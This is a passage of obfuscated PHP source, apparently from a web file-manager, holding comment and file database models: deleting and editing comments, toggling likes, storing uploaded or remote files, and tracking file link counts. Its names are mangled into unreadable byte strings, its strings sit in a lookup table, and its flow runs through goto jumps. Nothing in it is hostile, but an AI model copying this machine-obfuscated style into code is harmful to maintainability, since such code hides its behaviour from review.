array($C‘Î¥Æ˜[253] => $cŠ„ªõ÷¨, $C‘Î¥Æ˜[1754] => array()); if (!$cŠ„ªõ÷¨) { return $dåãË¼Ò´µ; } goto a×Š‰ãµ; f‚Í‰ù‚ô¡: $C‘Î¥Æ˜ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $A¶Ç…ÔÑ = array($C‘Î¥Æ˜[1755] => $c«İ…®é•); $aæÍíˆÜ†† = $this->where($A¶Ç…ÔÑ)->find(); goto E„õÇâ±¡; fÎÀİÅµ‹±: } public function remove($Eê…ÅÌ¥½„) { $D“ã„Áğæ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a±»•‹êÎÆ = array($D“ã„Áğæ[1748] => $Eê…ÅÌ¥½„); $A¿ Õ•˜ª = $this->where($a±»•‹êÎÆ)->find(); if ($A¿ Õ•˜ª[$D“ã„Áğæ[1747]]) { $this->where(array($D“ã„Áğæ[1748] => $A¿ Õ•˜ª[$D“ã„Áğæ[1747]]))->setAdd($D“ã„Áğæ[1749], -1); } return $this->where($a±»•‹êÎÆ)->delete(); } public function edit($c´í…šÖï‰, $aŒÍ±˜¶ã) { $b©ãÈëÜØù =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $EÂ«½ï«Û = array($b©ãÈëÜØù[1748] => $c´í…šÖï‰); return $this->where($EÂ«½ï«Û)->save(array($b©ãÈëÜØù[1757] => $aŒÍ±˜¶ã)); } public function prasise($c‰«íôˆÔ) { $fóÂÂ´³×’ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $AÉÄá¿Â ô = Model($fóÂÂ´³×’[1758]); $dÍÅÏ±Æ°˜ = array($fóÂÂ´³×’[1748] => $c‰«íôˆÔ, $fóÂÂ´³×’[1541] => USER_ID); $c´ØÇî³Áæ = $AÉÄá¿Â ô->where($dÍÅÏ±Æ°˜)->find(); if (!$c´ØÇî³Áæ) { $AÉÄá¿Â ô->add($dÍÅÏ±Æ°˜); $A®™ßêà×¸ = $this->where(array($fóÂÂ´³×’[1748] => $c‰«íôˆÔ))->setAdd($fóÂÂ´³×’[1750], 1); } else { $AÉÄá¿Â ô->where($dÍÅÏ±Æ°˜)->delete(); $A®™ßêà×¸ = $this->where(array($fóÂÂ´³×’[1748] => $c‰«íôˆÔ))->setAdd($fóÂÂ´³×’[1750], -1); } return $A®™ßêà×¸; } public function targetInfo($DÁ•ô‡·î¤, $Dí™ìƒáº½) { goto e—ç»É“Ê©; BõÙ„‘Ë¦: return $CÁ½”È¢¢½; goto Eæ‰ä¡ïŸ; e—ç»É“Ê©: $AÎÈ£­Ãë =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bçÃŸ²ƒŠ‡ = array($AÎÈ£­Ãë[574] => $DÁ•ô‡·î¤, $AÎÈ£­Ãë[575] => $Dí™ìƒáº½); $C·Êß–óœò = $this->where($bçÃŸ²ƒŠ‡)->count(); goto døöëùù†ö; døöëùù†ö: $aÚÔµÅÜÎŠ = "\x52\x49\x47\110\x54\x20\x4a\117\111\x4e\40{$this->tablePrefix}\143\157\x6d\x6d\x65\x6e\x74\137\x70\162\141\151\163\145\40\x73\164\141\162\x20\157\x6e\40\x63\157\155\x6d\145\x6e\164\x2e\x63\x6f\x6d\x6d\145\156\x74\111\104\40\x3d\x20\163\x74\141\x72\56\143\157\155\155\x65\156\164\x49\104"; $e»¨Ñ’¯îÈ = $this->alias($AÎÈ£­Ãë[352])->where($bçÃŸ²ƒŠ‡)->join($aÚÔµÅÜÎŠ, $AÎÈ£­Ãë[1759])->count(); $CÁ½”È¢¢½ = array($AÎÈ£­Ãë[1760] => $C·Êß–óœò, $AÎÈ£­Ãë[1761] => $e»¨Ñ’¯îÈ); goto BõÙ„‘Ë¦; Eæ‰ä¡ïŸ: } public function listData($BÃ”§‘ÄÏ) { $DéŸª£Á¿š =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (isset($BÃ”§‘ÄÏ[$DéŸª£Á¿š[1762]])) { if ($BÃ”§‘ÄÏ[$DéŸª£Á¿š[1762]]) { $BÃ”§‘ÄÏ[$DéŸª£Á¿š[1755]] = array($DéŸª£Á¿š[994], intval($BÃ”§‘ÄÏ[$DéŸª£Á¿š[1762]])); } unset($BÃ”§‘ÄÏ[$DéŸª£Á¿š[1762]]); } if (isset($BÃ”§‘ÄÏ[$DéŸª£Á¿š[1763]])) { if ($BÃ”§‘ÄÏ[$DéŸª£Á¿š[1763]]) { $BÃ”§‘ÄÏ[$DéŸª£Á¿š[1755]] = array($DéŸª£Á¿š[991], intval($BÃ”§‘ÄÏ[$DéŸª£Á¿š[1763]])); } unset($BÃ”§‘ÄÏ[$DéŸª£Á¿š[1763]]); } return $this->_listData($BÃ”§‘ÄÏ); } private function _listData($FãİÛ§˜¤) { $EñË·É· =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $e½”±ºÄ’ = $this->where($FãİÛ§˜¤)->_makeOrder()->selectPage(100); $this->_listAppendParent($e½”±ºÄ’[$EñË·É·[367]]); $this->_listAppendUser($e½”±ºÄ’[$EñË·É·[367]]); $this->_listAppendMeta($e½”±ºÄ’[$EñË·É·[367]]); return $e½”±ºÄ’; } private function _makeOrder() { $D×±ìÙê° =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $FÓ•¿›óÆÁ = array($D×±ìÙê°[1750], $D×±ìÙê°[1749], $D×±ìÙê°[194]); $c©¹ª‚¿µ = Input::get($D×±ìÙê°[449], $D×±ìÙê°[7], $D×±ìÙê°[418], $FÓ•¿›óÆÁ); $F©æ»¸óÍá = Input::get($D×±ìÙê°[450], $D×±ìÙê°[7], $D×±ìÙê°[1543], array($D×±ìÙê°[1764], $D×±ìÙê°[445])); $aÁÑ‘Æøæç = $c©¹ª‚¿µ . $D×±ìÙê°[50] . $F©æ»¸óÍá; return $this->order($aÁÑ‘Æøæç); } private function _listAppendParent(&$bÑ‘…„•ã¦) { goto EÃ“§œÙè‰; A³æ­Ä¯¾: foreach ($bÑ‘…„•ã¦ as &$DÛ×Ö…ì¡) { if (isset($a™ÕĞÊéíÔ[$DÛ×Ö…ì¡[$B»ˆ®½é‘¸[1747]]])) { $DÛ×Ö…ì¡[$B»ˆ®½é‘¸[1765]] = $a™ÕĞÊéíÔ[$DÛ×Ö…ì¡[$B»ˆ®½é‘¸[1747]]]; } } unset($DÛ×Ö…ì¡); goto eÅº¯«‹„¼; e­ß¬Ü„ƒ: if (!$Bˆìãœ²Éˆ) { return; } $a™ÕĞÊéíÔ = $this->where(array($B»ˆ®½é‘¸[1748] => array($B»ˆ®½é‘¸[7], $Bˆìãœ²Éˆ)))->select(); $a™ÕĞÊéíÔ = array_to_keyvalue($a™ÕĞÊéíÔ, $B»ˆ®½é‘¸[1755]); goto A³æ­Ä¯¾; EÃ“§œÙè‰: $B»ˆ®½é‘¸ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Bˆìãœ²Éˆ = array_unique(array_to_keyvalue($bÑ‘…„•ã¦, $B»ˆ®½é‘¸[33], $B»ˆ®½é‘¸[1747])); $Bˆìãœ²Éˆ = array_remove_value($Bˆìãœ²Éˆ, $B»ˆ®½é‘¸[191]); goto e­ß¬Ü„ƒ; eÅº¯«‹„¼: } private function _listAppendUser(&$Cç‰ì¢å×) { goto aÁÛ‚âõõƒ; c›µŒ‘Ëë: if (count($Dä‰ƒ÷Šß¡) == 0) { return; } foreach ($Cç‰ì¢å× as $Bëš‘Š²‚¿) { if (isset($Bëš‘Š²‚¿[$b¾»ç¤­òÈ[1765]])) { $Dä‰ƒ÷Šß¡[] = $Bëš‘Š²‚¿[$b¾»ç¤­òÈ[1765]][$b¾»ç¤­òÈ[1550]]; } } $bà´„Ôš â = Model($b¾»ç¤­òÈ[532])->userListInfo($Dä‰ƒ÷Šß¡); goto A½›„ôœİÕ; aÁÛ‚âõõƒ: $b¾»ç¤­òÈ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Dä‰ƒ÷Šß¡ = array_unique(array_to_keyvalue($Cç‰ì¢å×, $b¾»ç¤­òÈ[33], $b¾»ç¤­òÈ[1550])); $Dä‰ƒ÷Šß¡ = array_remove_value($Dä‰ƒ÷Šß¡, $b¾»ç¤­òÈ[191]); goto c›µŒ‘Ëë; A½›„ôœİÕ: foreach ($Cç‰ì¢å× as &$Bëš‘Š²‚¿) { $Bëš‘Š²‚¿[$b¾»ç¤­òÈ[588]] = $bà´„Ôš â[$Bëš‘Š²‚¿[$b¾»ç¤­òÈ[1550]]]; if (isset($Bëš‘Š²‚¿[$b¾»ç¤­òÈ[1765]])) { $Bëš‘Š²‚¿[$b¾»ç¤­òÈ[1765]][$b¾»ç¤­òÈ[588]] = $bà´„Ôš â[$Bëš‘Š²‚¿[$b¾»ç¤­òÈ[1765]][$b¾»ç¤­òÈ[1550]]]; } } unset($Bëš‘Š²‚¿); goto c°©•§”­; c°©•§”­: } private function _listAppendMeta(&$B©è©³È¿) { goto eÊÑÊÓ›»; báŞ¿¬¯„: if (!$a¯«Í‹À ) { return !1; } foreach ($B©è©³È¿ as &$f…œÀ„‘) { $f…œÀ„‘[$cÏªùØ¯¬Ë[459]] = $a¯«Í‹À [$f…œÀ„‘[$cÏªùØ¯¬Ë[1755]]]; if (isset($f…œÀ„‘[$cÏªùØ¯¬Ë[1765]])) { $f…œÀ„‘[$cÏªùØ¯¬Ë[1765]][$cÏªùØ¯¬Ë[459]] = $a¯«Í‹À [$f…œÀ„‘[$cÏªùØ¯¬Ë[1765]][$cÏªùØ¯¬Ë[1755]]]; } } unset($f…œÀ„‘); goto Cğ’Ñ°®„õ; eÊÑÊÓ›»: $cÏªùØ¯¬Ë =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $A¼ÉÜİÒ× = array_unique(array_to_keyvalue($B©è©³È¿, $cÏªùØ¯¬Ë[33], $cÏªùØ¯¬Ë[1755])); $A¼ÉÜİÒ× = array_remove_value($A¼ÉÜİÒ×, $cÏªùØ¯¬Ë[191]); goto fŠõŠ¶•Ñ; fŠõŠ¶•Ñ: if (!$A¼ÉÜİÒ×) { return; } foreach ($B©è©³È¿ as $f…œÀ„‘) { if (isset($f…œÀ„‘[$cÏªùØ¯¬Ë[1765]])) { $A¼ÉÜİÒ×[] = $f…œÀ„‘[$cÏªùØ¯¬Ë[1765]][$cÏªùØ¯¬Ë[1755]]; } } $a¯«Í‹À  = $this->metaList($A¼ÉÜİÒ×); goto báŞ¿¬¯„; Cğ’Ñ°®„õ: } private function metaList($Døö²…®×Ø) { goto d¤õ¾´„º; Bê·†³‰®·: $e‰¾Ò§ôßä = Model($d÷ÊèË–ÑŸ[1766])->where($EÃ—‡§–ÕÍ)->select(); $e‰¾Ò§ôßä = array_to_keyvalue_group($e‰¾Ò§ôßä, $d÷ÊèË–ÑŸ[1755]); foreach ($e‰¾Ò§ôßä as $A¿É‰‘Â“ => $ašÊÊç²¹) { $bÕŠ…ğæ¡ = array(); foreach ($ašÊÊç²¹ as $eÌÍ‹ÂŸÏ) { $bÕŠ…ğæ¡[$eÌÍ‹ÂŸÏ[$d÷ÊèË–ÑŸ[93]]] = $eÌÍ‹ÂŸÏ[$d÷ÊèË–ÑŸ[372]]; } $e‰¾Ò§ôßä[$A¿É‰‘Â“] = $bÕŠ…ğæ¡; } goto Cİƒå‘½¿; d¤õ¾´„º: $d÷ÊèË–ÑŸ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$Døö²…®×Ø) { return array(); } $EÃ—‡§–ÕÍ = array($d÷ÊèË–ÑŸ[1755] => array($d÷ÊèË–ÑŸ[7], $Døö²…®×Ø)); goto Bê·†³‰®·; Cİƒå‘½¿: return $e‰¾Ò§ôßä ? $e‰¾Ò§ôßä : array(); goto b¿¿è¨§; b¿¿è¨§: } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\137\146\151\x6c\x65\x5f\143\157\156\164\145\x6e\x74\163"; protected $dataAuto = array(array("\143\162\145\x61\x74\145\124\151\x6d\145", "\x74\x69\x6d\x65", "\151\x6e\163\145\162\x74", "\146\x75\x6e\x63\164\x69\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\151\x6c\145"; protected $tableMeta = array("\x74\141\142\x6c\x65\116\x61\155\145" => "\151\x6f\137\x66\151\x6c\x65\137\155\x65\164\141", "\x6d\145\x74\x61\x46\x69\145\x6c\x64" => "\x66\151\154\x65\111\x44"); public function fileInfo($E¶´¨›áè¬) { $aâ™ˆŠĞÈÆ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; static $FÛ‡˜çä‰Ï = array(); if (!isset($FÛ‡˜çä‰Ï[$E¶´¨›áè¬])) { $F¡›ÜÙÂÉ = $aâ™ˆŠĞÈÆ[1767]; $EÎ¢™•Åë = Model($aâ™ˆŠĞÈÆ[464])->field($F¡›ÜÙÂÉ)->where(array($aâ™ˆŠĞÈÆ[462] => $E¶´¨›áè¬))->find(); $FÛ‡˜çä‰Ï[$E¶´¨›áè¬] = $EÎ¢™•Åë; } return $FÛ‡˜çä‰Ï[$E¶´¨›áè¬]; } public function addFileByContent($F·Â·è®Ñ = '', $b…ÃÂ‚ãŠ = '') { goto E­æÊíà˜Œ; Fö‚– Ú±¼: if (file_exists($dèİÕ›©ÕÈ)) { @unlink($dèİÕ›©ÕÈ); } return $D°—ªÌ×É½; goto C¿ºÔÁÆ‚ó; F“Ç¬Ù¦Êã: $dèİÕ›©ÕÈ = $fŠ¢ôÆË¶ . $B‚ƒ§†§Ö©[1769] . rand_string(16); file_put_contents($dèİÕ›©ÕÈ, $F·Â·è®Ñ); $D°—ªÌ×É½ = $this->addFile($dèİÕ›©ÕÈ, $b…ÃÂ‚ãŠ, !0); goto Fö‚– Ú±¼; E­æÊíà˜Œ: $B‚ƒ§†§Ö© =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fŠ¢ôÆË¶ = TEMP_PATH . $B‚ƒ§†§Ö©[1768]; if (!is_dir($fŠ¢ôÆË¶)) { mk_dir($fŠ¢ôÆË¶); } goto F“Ç¬Ù¦Êã; C¿ºÔÁÆ‚ó: } public function createFileName($b’°¦ÚÌ–Š, $C˜¥ÊÛÏØÕ = false, $DÑ³ïÀ± = false) { goto E¶‰óö§Øµ; E¶‰óö§Øµ: $B©–†ŒŠ– =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $A›©‚î¨¥‹ = IO::init($B©–†ŒŠ–[8]); $AÛ†ÉË¿İ‘ = $this->makeFilePath($b’°¦ÚÌ–Š, $A›©‚î¨¥‹, $C˜¥ÊÛÏØÕ, $DÑ³ïÀ±); goto Cß‡ê¼Ç†Ç; fì¢ØÅ†íØ: if (!$fÛºŒ¾Èù && !Cache::get($DÛò™óºÕ)) { $fÛºŒ¾Èù = !0; $a‘˜ÜíØµÂ = IO::mkdir($F‚¢«ÚÔóö); if (!IO::exist($a‘˜ÜíØµÂ . $B©–†ŒŠ–[784])) { IO::mkfile($a‘˜ÜíØµÂ . $B©–†ŒŠ–[784]); } Cache::set($DÛò™óºÕ, 1, 3600 * 2); } return $AÛ†ÉË¿İ‘; goto bÓÕµ›“™ê; Cß‡ê¼Ç†Ç: $F‚¢«ÚÔóö = $A›©‚î¨¥‹->pathFather($AÛ†ÉË¿İ‘); static $fÛºŒ¾Èù = false; $DÛò™óºÕ = $B©–†ŒŠ–[1770] . md5($F‚¢«ÚÔóö); goto fì¢ØÅ†íØ; bÓÕµ›“™ê: } public function makeFilePath($dè—‹æ¨ù, $DÜ×¡èæÎ, $Eµôòù¯Šè = false, $cà‘‰æ½â† = false) { goto B™Ó¯ÕÙá¬; dÕçä‡á¢: if (!$dè—‹æ¨ù) { $fÃ§ÍÖª›ì = $B ¢Í„ÉáŒ[1773]; } switch ($fÃ§ÍÖª›ì) { case $B ¢Í„ÉáŒ[1774]: $dåÕ…ìáìÜ = $dåÕ…ìáìÜ . $B ¢Í„ÉáŒ[95] . $DÜ×¡èæÎ->ext($dè—‹æ¨ù); if ($CÃğŸ‹Á¨º == $B ¢Í„ÉáŒ[1709]) { $dåÕ…ìáìÜ .= $B ¢Í„ÉáŒ[1447]; } break; case $B ¢Í„ÉáŒ[1775]: goto BÑóº‹óĞ; DÇª°‘ë¢¡: if (IO::isTypeObject($dåÕ…ìáìÜ) && !IO::isUploadServer($dåÕ…ìáìÜ)) { if (IO::exist($dåÕ…ìáìÜ)) { return $dåÕ…ìáìÜ; } $EäŠ´¨·ä = IO::setContent($dåÕ…ìáìÜ, $B ¢Í„ÉáŒ[33]); if (!$EäŠ´¨·ä) { show_json($B ¢Í„ÉáŒ[1778], !1); } } CacheLock::unlock($C§É›²Ï«‰); break; goto CÓÒÁèÕÇ; eò¼… óŞ»: $aí„·ÓÇÛÓ = $B ¢Í„ÉáŒ[1145] . $Côïš‹­«Ÿ[$B ¢Í„ÉáŒ[395]] . $B ¢Í„ÉáŒ[404] . date($B ¢Í„ÉáŒ[1776]) . $E»»¯ñÃ£¹ . $B ¢Í„ÉáŒ[8]; if ($CÃğŸ‹Á¨º == $B ¢Í„ÉáŒ[1709]) { $dè—‹æ¨ù .= $B ¢Í„ÉáŒ[1447]; } $C§É›²Ï«‰ = $B ¢Í„ÉáŒ[1777] . $aí„·ÓÇÛÓ . $dè—‹æ¨ù; goto Fô¬ë¦ “£; Fô¬ë¦ “£: CacheLock::lock($C§É›²Ï«‰); $dåÕ…ìáìÜ = $aí„·ÓÇÛÓ . $dè—‹æ¨ù; if (IO::exist($aí„·ÓÇÛÓ . $dè—‹æ¨ù)) { $F‘¤Íø˜ß‹ = substr($dè—‹æ¨ù, 0, strlen($dè—‹æ¨ù) - strlen($CÃğŸ‹Á¨º)); $dØ¿ğ¶ºê = $cà‘‰æ½â† ? substr($cà‘‰æ½â†, 0, 5) : ($Eµôòù¯Šè ? substr($Eµôòù¯Šè, 0, 5) : rand_string(5)); $dåÕ…ìáìÜ = $aí„·ÓÇÛÓ . $F‘¤Íø˜ß‹ . $dØ¿ğ¶ºê . $B ¢Í„ÉáŒ[95] . $CÃğŸ‹Á¨º; } goto DÇª°‘ë¢¡; BÑóº‹óĞ: $càŒá¥Ë¸Š = Model($B ¢Í„ÉáŒ[751])->get($B ¢Í„ÉáŒ[752]); $E»»¯ñÃ£¹ = substr(md5($B ¢Í„ÉáŒ[753] . $càŒá¥Ë¸Š . date($B ¢Í„ÉáŒ[729])), 0, 8); $Côïš‹­«Ÿ = KodIO::defaultDriver(); goto eò¼… óŞ»; CÓÒÁèÕÇ: case $B ¢Í„ÉáŒ[1773]: break; default: break; } return $dåÕ…ìáìÜ; goto a¼ã¸–ƒ©´; B™Ó¯ÕÙá¬: $B ¢Í„ÉáŒ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fÃ§ÍÖª›ì = Model($B ¢Í„ÉáŒ[751])->get($B ¢Í„ÉáŒ[1771]); $aí„·ÓÇÛÓ = KodIO::defaultIO() . date($B ¢Í„ÉáŒ[1772]); goto dŠšÓÖ¿óê; dŠšÓÖ¿óê: $dåÕ…ìáìÜ = $aí„·ÓÇÛÓ . rand_string(5) . short_id(100); $dè—‹æ¨ù = str_replace($B ¢Í„ÉáŒ[8], $B ¢Í„ÉáŒ[71], KodIO::clear($dè—‹æ¨ù)); $CÃğŸ‹Á¨º = $DÜ×¡èæÎ->ext($dè—‹æ¨ù); goto dÕçä‡á¢; a¼ã¸–ƒ©´: } public function addFileByRemote($Bœ‚øš•Ä†, $DĞåøŸƒ¾, $CœÛÀÆÅ„½ = array()) { goto dÄ†¾ÏƒŒ¯; DÜ˜ÒĞĞôÔ: $dÇ†ÅÜÑ§ = IO::hashMd5($Bœ‚øš•Ä†, $FÄ‡Ú¿ò’é); $fğÌğäôİÖ = KodIO::defaultDriver(); $eêíğ¿Šá“ = array($EÚÂÕö‹¹[573] => IO::size($Bœ‚øš•Ä†), $EÚÂÕö‹¹[1779] => 1, $EÚÂÕö‹¹[415] => $DĞåøŸƒ¾, $EÚÂÕö‹¹[796] => $fğÌğäôİÖ[$EÚÂÕö‹¹[395]], $EÚÂÕö‹¹[416] => $Bœ‚øš•Ä†, $EÚÂÕö‹¹[1780] => $CœÛÀÆÅ„½[$EÚÂÕö‹¹[171]] ? $CœÛÀÆÅ„½[$EÚÂÕö‹¹[171]] : IO::hashSimple($Bœ‚øš•Ä†), $EÚÂÕö‹¹[1781] => $dÇ†ÅÜÑ§ ? $dÇ†ÅÜÑ§ : $FÄ‡Ú¿ò’é); goto CÎÉÌ—Ñ; dÄ†¾ÏƒŒ¯: $EÚÂÕö‹¹ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!IO::exist($Bœ‚øš•Ä†)) { return !1; } $FÄ‡Ú¿ò’é = $CœÛÀÆÅ„½[$EÚÂÕö‹¹[170]] ? $CœÛÀÆÅ„½[$EÚÂÕö‹¹[170]] : $EÚÂÕö‹¹[33]; goto DÜ˜ÒĞĞôÔ; CÎÉÌ—Ñ: if ($fÄéîˆé½³ = $this->addFileCheckExist($eêíğ¿Šá“[$EÚÂÕö‹¹[171]], $eêíğ¿Šá“[$EÚÂÕö‹¹[170]], $eêíğ¿Šá“[$EÚÂÕö‹¹[78]])) { return $fÄéîˆé½³; } return $this->addFileData($eêíğ¿Šá“); goto eÃéãàÛêœ; eÃéãàÛêœ: } private function addFileData($FÇÖÇÏõ„†) { $aï³¯œ‹µì =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$FÇÖÇÏõ„†) { return !1; } $FÇÖÇÏõ„†[$aï³¯œ‹µì[78]] = intval($FÇÖÇÏõ„†[$aï³¯œ‹µì[78]]); if (!$FÇÖÇÏõ„†[$aï³¯œ‹µì[78]] && strlen($FÇÖÇÏõ„†[$aï³¯œ‹µì[171]]) > 32) { $FÇÖÇÏõ„†[$aï³¯œ‹µì[78]] = intval(substr($FÇÖÇÏõ„†[$aï³¯œ‹µì[171]], 32)); } $a¦ö‡‹‹Êë = $this->add($FÇÖÇÏõ„†); return $this->find($a¦ö‡‹‹Êë); } public function addFile($DàÉ“Òùæ×, $eóáóõòš, $eÏ‚Òìš½Ì = false) { goto Aˆ‡®À¸·™; C¹³¯Ó‘·£: return $AÑãÁÃÔ±¯; goto b³ó¬–…’¡; E‘¼½Ğ‚°Ğ: $eŸ‚²ö»òÊ = $_SERVER[Ôğ—¤Šµˆ˜ñ£][1782] . $eÊÀ§ò¥; CacheLock::lock($eŸ‚²ö»òÊ); if ($aá´Šïàä¡ = $this->addFileCheckExist($aÂí§µ‘‹–, $eÊÀ§ò¥, $Bâ¯³ÆÏï)) { CacheLock::unlock($eŸ‚²ö»òÊ); return $aá´Šïàä¡; } goto EŠ™Áñ§ËÈ; EŠ™Áñ§ËÈ: $D¶ïˆç†À = $this->addFileMake($DàÉ“Òùæ×, $Bâ¯³ÆÏï, $aÂí§µ‘‹–, $eÊÀ§ò¥, $eóáóõòš, $eÏ‚Òìš½Ì); $AÑãÁÃÔ±¯ = $this->addFileData($D¶ïˆç†À); CacheLock::unlock($eŸ‚²ö»òÊ); goto C¹³¯Ó‘·£; Aˆ‡®À¸·™: $aÂí§µ‘‹– = IO::hashSimple($DàÉ“Òùæ×); $eÊÀ§ò¥ = IO::hashMd5($DàÉ“Òùæ×); $Bâ¯³ÆÏï = IO::size($DàÉ“Òùæ×); goto E‘¼½Ğ‚°Ğ; b³ó¬–…’¡: } public function addFileMake($d¥ˆö²°¨, $f¼Ú¤µÓæ¥, $eƒâˆ”‡“î, $B¥‚ƒàòÄÚ, $aš½‰ã À•, $fÕ™±ùãÔ¯) { goto B®Ù…ôŞ§¤; B®Ù…ôŞ§¤: $DƒÅ¥§Ú’ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $F‚»’®é…â = $this->createFileName($aš½‰ã À•, $eƒâˆ”‡“î, $B¥‚ƒàòÄÚ); $D•Ç³»…¥° = get_path_father($F‚»’®é…â); goto E²Ó­©ó‘; Dº¢ÀäÈŸ: $E¯Ê‰·÷ÑÕ = KodIO::defaultDriver(); $A…Ú‘¸Á‡… = array($DƒÅ¥§Ú’[573] => $f¼Ú¤µÓæ¥, $DƒÅ¥§Ú’[1779] => 1, $DƒÅ¥§Ú’[415] => $aš½‰ã À•, $DƒÅ¥§Ú’[796] => $E¯Ê‰·÷ÑÕ[$DƒÅ¥§Ú’[395]], $DƒÅ¥§Ú’[416] => $F‚»’®é…â, $DƒÅ¥§Ú’[1780] => $eƒâˆ”‡“î, $DƒÅ¥§Ú’[1781] => $B¥‚ƒàòÄÚ); return $A…Ú‘¸Á‡…; goto d¬¾İ£ŸÄÀ; E²Ó­©ó‘: $F¯Ñ ÓÂŞà = get_path_this($F‚»’®é…â); if ($fÕ™±ùãÔ¯) { $dŸÆàèŒ½Ò = IO::move($d¥ˆö²°¨, $D•Ç³»…¥°, !1, $F¯Ñ ÓÂŞà); } else { $dŸÆàèŒ½Ò = IO::copy($d¥ˆö²°¨, $D•Ç³»…¥°, !1, $F¯Ñ ÓÂŞà); } if (!$dŸÆàèŒ½Ò) { return !1; } goto Dº¢ÀäÈŸ; d¬¾İ£ŸÄÀ: } public function addFileCheckExist($bÉ†ˆÀƒâ—, $f¾ŒŞå•›ª, $ašÖŠ®®”‰) { $CŒØ©š« º =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $càùÀ—¾‘“ = $this->findByHash($bÉ†ˆÀƒâ—, $f¾ŒŞå•›ª); if (!$càùÀ—¾‘“) { return !1; } $céÙÂƒ„Í‡ = array($CŒØ©š« º[1779] => intval($càùÀ—¾‘“[$CŒØ©š« º[1783]]) + 1, $CŒØ©š« º[573] => $ašÖŠ®®”‰); $this->where(array($CŒØ©š« º[462] => $càùÀ—¾‘“[$CŒØ©š« º[461]]))->save($céÙÂƒ„Í‡); return $càùÀ—¾‘“; } public function remove($bâÙ¦©êåô) { $this->linkCountChange($bâÙ¦©êåô, !1); $this->clearEmpty(); return !0; } public function linkAdd($bÊ¦›’ÒŠâ) { $this->linkCountChange($bÊ¦›’ÒŠâ, !0); } public function linkCountChange($D ˆĞ¥½Ş…, $AÏ‘¬í„™») { goto c¯‡Ôö‹¾×; D–ö‚àÀõ: foreach ($dŸôêäºè‘ as $fÎŒ´ÄùÛœ => $d¸¸Æ¦åÁ) { $Eƒ¢ ºÌëæ = $d¸¸Æ¦åÁ . $BâãŸÔ„‰à[33]; if (!$Eêè•Ò’±Ì[$Eƒ¢ ºÌëæ]) { $Eêè•Ò’±Ì[$Eƒ¢ ºÌëæ] = array(); } $Eêè•Ò’±Ì[$Eƒ¢ ºÌëæ][] = $fÎŒ´ÄùÛœ; } foreach ($Eêè•Ò’±Ì as $d¸¸Æ¦åÁ => $eÜÎ„ªÒ“Œ) { if (!$eÜÎ„ªÒ“Œ) { continue; } $d¸¸Æ¦åÁ = $AÏ‘¬í„™» ? $d¸¸Æ¦åÁ : -intval($d¸¸Æ¦åÁ); $d¹çï¡¥‡  = array($BâãŸÔ„‰à[461] => array($BâãŸÔ„‰à[7], $eÜÎ„ªÒ“Œ)); if ($d¸¸Æ¦åÁ < 0) { $d¹çï¡¥‡ [$BâãŸÔ„‰à[1783]] = array($BâãŸÔ„‰à[995], abs($d¸¸Æ¦åÁ)); } $this->where($d¹çï¡¥‡ )->setAdd($BâãŸÔ„‰à[1783], $d¸¸Æ¦åÁ); } goto EìéÊõÕÏ“; eŞîÚ¦‹: $dŸôêäºè‘ = array(); foreach ($D ˆĞ¥½Ş… as $fÎŒ´ÄùÛœ) { $Eƒ¢ ºÌëæ = $fÎŒ´ÄùÛœ . $BâãŸÔ„‰à[33]; if (!$dŸôêäºè‘[$Eƒ¢ ºÌëæ]) { $dŸôêäºè‘[$Eƒ¢ ºÌëæ] = 0; } $dŸôêäºè‘[$Eƒ¢ ºÌëæ]++; } $Eêè•Ò’±Ì = array(); goto D–ö‚àÀõ; c¯‡Ôö‹¾×: $BâãŸÔ„‰à =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$D ˆĞ¥½Ş…) { return; } if (!is_array($D ˆĞ¥½Ş…)) { $D ˆĞ¥½Ş… = array($D ˆĞ¥½Ş…); } goto eŞîÚ¦‹; EìéÊõÕÏ“: } public function findByHash($C„ÏŒÂ›‚Ú, $E»­É¨Ë™Œ = false) { $cÑÌ—ğËÄ± =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$C„ÏŒÂ›‚Ú && !$E»­É¨Ë™Œ) { return !1; } $fÏÂ©æÙàá = array($cÑÌ—ğËÄ±[1780] => $C„ÏŒÂ›‚Ú); if ($E»­É¨Ë™Œ) { $fÏÂ©æÙàá = array($cÑÌ—ğËÄ±[1781] => $E»­É¨Ë™Œ); } return $this->order($cÑÌ—ğËÄ±[1784])->where($fÏÂ©æÙàá)->find(); } public function clearEmpty($E±¤é‚™ƒª = 0) { goto C²²Şˆ¦õ¸; C²²Şˆ¦õ¸: $b™ª¯ª¼Ú³ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $CŠØ¯œ• = time() - 3600 * 24 * $E±¤é‚™ƒª; $CÍŒƒ ±”Â = $b™ª¯ª¼Ú³[1785] . $CŠØ¯œ•; goto b¢Ó­Ş’‚Ñ; b¢Ó­Ş’‚Ñ: $EÒ¯Ö™“– = $this->where($CÍŒƒ ±”Â)->select(); if (!$EÒ¯Ö™“–) { return; } $F«àó†Åõä = new Task($b™ª¯ª¼Ú³[1786], $b™ª¯ª¼Ú³[33], count($EÒ¯Ö™“–)); goto aíÌ‡óŠ–‹; aíÌ‡óŠ–‹: foreach ($EÒ¯Ö™“– as $BÍ­êÅ¥‰) { $F«àó†Åõä->update(1); $this->resetFile($BÍ­êÅ¥‰); } 